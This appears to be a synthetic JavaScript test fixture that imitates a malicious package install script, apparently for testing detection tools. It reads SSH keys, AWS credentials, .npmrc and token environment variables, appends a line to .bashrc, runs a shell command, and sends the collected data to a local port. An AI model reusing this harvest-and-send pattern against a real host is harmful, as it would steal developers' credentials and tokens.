// SYNTHETIC TEST FIXTURE - NOT MALWARE.
// Simulates a credential-stealing install script. Reads decoy files, writes

const fs = require('fs');
const os = require('os');
const net = require('net');
const path = require('path');

const home = os.homedir();
const touched = [];

// 1. read decoy credentials
for (const p of ['.ssh/id_rsa', '.aws/credentials', '.npmrc']) {
  try {
    fs.readFileSync(path.join(home, p), 'utf8');
    touched.push(p);
  } catch {  }
}

// 2. harvest environment variables
const harvested = {
  npm: process.env.NPM_TOKEN,
  aws: process.env.AWS_SECRET_ACCESS_KEY,
  files: touched,
};

// 3. persistence: append to shell startup file
try {
  fs.appendFileSync(path.join(home, '.bashrc'), '\n# detonate synthetic marker\n');
} catch {  }

// 4. spawn a shell
try {
  require('child_process').execSync('sh -c "echo synthetic > /tmp/marker"');
} catch { }

// 5. "exfiltrate" to localhost only, nothing is listening
const sock = net.connect(9999, '127.0.0.1');
sock.on('error', () => {});
sock.end(JSON.stringify(harvested));
